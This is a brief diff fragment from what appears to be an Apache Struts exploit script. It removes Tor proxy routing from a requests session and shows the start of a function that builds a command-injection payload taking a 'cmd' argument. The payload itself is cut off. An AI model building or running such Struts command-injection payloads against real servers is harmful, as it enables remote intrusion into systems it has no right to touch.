@@ -15,9 +15,6 @@ logo = r"""
 
 
 session = requests.session()
-session.proxies = {}
-session.proxies['http'] = 'socks5h://localhost:9050'
-session.proxies['https'] = 'socks5h://localhost:9050'
 
 def payload_struts_three(cmd):
     payload = "%{"
